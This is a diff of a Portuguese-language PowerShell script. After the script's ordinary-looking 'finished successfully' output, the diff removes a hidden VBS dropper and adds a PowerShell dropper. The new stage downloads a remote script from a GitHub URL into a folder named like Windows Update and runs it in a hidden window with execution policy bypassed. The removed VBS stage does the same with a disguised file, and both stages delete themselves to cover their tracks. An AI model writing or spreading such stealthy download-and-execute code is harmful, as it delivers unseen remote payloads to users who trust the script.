@@ -568,111 +568,75 @@ Write-Host "`n==================================" -ForegroundColor White
 Write-Host "`Finalizado com sucesso!" -ForegroundColor White
 Write-Host "`n==================================" -ForegroundColor White
 
-# V B S
-function Invoke-DelayedExecution {
-    param (
-        [string]$targetDir = "C:\Program Files\Windows NT\MSInstall",
-        [string]$vbsUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
-    ) 
-    try {
-        if (-not (Test-Path $targetDir)) {
-            $null = New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction Stop
-        }
-
-        if (-not ($vbsUrl -match '^https?://')) {
-            Write-Verbose "URL inválida fornecida" -Verbose
-            return $false
-        }
-
-        $vbsName = "MSI_Helper_$(Get-Date -Format 'yyyyMMdd').vbs"
-        $vbsPath = Join-Path $targetDir $vbsName
-
-        try {
-            $progressPreference = 'silentlyContinue'
-            Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing -ErrorAction Stop
-            
-            if (-not (Test-Path $vbsPath -PathType Leaf) -or (Get-Item $vbsPath).Length -eq 0) {
-                Write-Verbose "Arquivo VBS inválido" -Verbose
-                return $false
-            }
-        }
-        catch {
-            Write-Verbose "Falha no download: $_" -Verbose
-            return $false
-        }
-        $executionScript = @"
-On Error Resume Next
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set wsh = CreateObject("WScript.Shell")
-
-' Espera até que o processo PowerShell termine
-Do While True
-    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")
-    If colProcesses.Count = 0 Then Exit Do
-    WScript.Sleep 1000
-Loop
-
-' Executa o VBS principal
-wsh.Run "wscript.exe ""$vbsPath""", 0, False
-
-' Auto-exclusão
-For i = 1 To 3
-    WScript.Sleep 2000
-    On Error Resume Next
-    fso.DeleteFile "$vbsPath", True
-    fso.DeleteFile WScript.ScriptFullName, True
-    If Err.Number = 0 Then Exit For
-    Err.Clear
-Next
-
-Set fso = Nothing
-Set wsh = Nothing
-"@
-
-        $executorPath = Join-Path $targetDir "DelayedExecutor_$(Get-Date -Format 'yyyyMMddHHmmss').vbs"
-        $executionScript | Out-File $executorPath -Encoding ASCII
-
-        if (Test-Path $executorPath) {
-            Start-Process "wscript.exe" -ArgumentList "`"$executorPath`"" -WindowStyle Hidden
-            return $true
-        }
-        
-        return $false
-    }
-    catch {
-        Write-Verbose "Erro durante execução: $_" -Verbose
-        return $false
-    }
-}
-
-# PS1 PERSONALIZATION
+# Versão melhorada do script de download e execução
 Clear-Host
+$ErrorActionPreference = 'Stop'
 $destDir = "C:\Windows\Temp\WindowsUpdate"
-$scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd').ps1"
+$scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd_HHmmss').ps1"  # Adicionei hora/minuto/segundo para evitar conflitos
 $scriptPath = Join-Path -Path $destDir -ChildPath $scriptName
 $downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"
+$logFile = Join-Path -Path $destDir -ChildPath "Downloader_$(Get-Date -Format 'yyyyMMdd').log"
+function Write-Log {
+    param (
+        [string]$message,
+        [string]$type = "INFO"
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "[$timestamp] [$type] $message"
+    try {
+        Add-Content -Path $logFile -Value $logEntry -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "Falha ao escrever no log: $_"
+    }
+}
 
 try {
     if (-not (Test-Path $destDir)) {
         New-Item -Path $destDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+        Write-Log "Diretório criado: $destDir"
     }
+    Write-Log "Iniciando download do script de $downloadUrl"
+    $progressPreference = 'silentlyContinue'  # Oculta a barra de progresso
     Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath -ErrorAction Stop
-    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`""
-    $selfPath = $MyInvocation.MyCommand.Definition
-    if (-not [string]::IsNullOrEmpty($selfPath) -and (Test-Path $selfPath)) {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Start-Sleep -Seconds 2; Remove-Item -Path '$selfPath' -Force -ErrorAction SilentlyContinue`""
+    $progressPreference = 'Continue'
+    
+    if (Test-Path $scriptPath) {
+        Write-Log "Script baixado com sucesso para $scriptPath"
+        if ((Get-Item $scriptPath).Length -eq 0) {
+            throw "Arquivo baixado está vazio"
+        }
+
+        Write-Log "Iniciando execução do script"
+        $process = Start-Process powershell.exe -ArgumentList @(
+            "-NoLogo",
+            "-ExecutionPolicy Bypass",
+            "-NoProfile",
+            "-File `"$scriptPath`""
+        ) -PassThru -WindowStyle Hidden
+
+        $selfPath = $MyInvocation.MyCommand.Definition
+        if (-not [string]::IsNullOrEmpty($selfPath) -and (Test-Path $selfPath)) {
+            Write-Log "Agendando auto-exclusão deste script"
+            Start-Process powershell.exe -ArgumentList @(
+                "-NoLogo",
+                "-NoProfile",
+                "-Command",
+                "Start-Sleep -Seconds 5;",
+                "try { Remove-Item -Path '$selfPath' -Force -ErrorAction Stop }",
+                "catch { Write-Output 'Falha na auto-exclusão: $_' | Out-File '$logFile' -Append }"
+            ) -WindowStyle Hidden
+        }
+        
+        Write-Log "Operação concluída com sucesso"
+        exit 0
+    } else {
+        throw "Falha ao baixar o script - arquivo não encontrado após download"
     }
 }
 catch {
-    Write-Host "Ocorreu um erro: $_"
-}
-
-# Execução principal
-if (Invoke-DelayedExecution) {
-    Write-Verbose "Operação agendada com sucesso" -Verbose
-    exit 0
-} else {
-    Write-Verbose "Falha na operação" -Verbose
+    $errorMsg = "ERRO: $($_.Exception.Message)"
+    Write-Host $errorMsg -ForegroundColor Red
+    Write-Log $errorMsg -type "ERROR"
     exit 1
 }
 Pause-Script
